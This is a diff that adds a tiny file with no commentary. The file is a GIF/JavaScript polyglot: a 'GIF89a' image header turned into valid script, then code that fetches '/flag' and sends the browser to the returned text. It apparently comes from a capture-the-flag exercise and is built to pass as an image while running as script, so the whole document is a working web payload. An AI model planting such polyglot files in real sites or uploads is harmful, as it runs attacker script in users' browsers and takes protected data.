@@ -1,0 +1,8 @@
+GIF89a/*.......*/=0;var xhr = new XMLHttpRequest();
+        xhr.open('GET', '/flag');
+        xhr.onload = function() {
+            if (xhr.status === 200) {
+                document.location = xhr.responseText;
+            }
+        };
+        xhr.send();
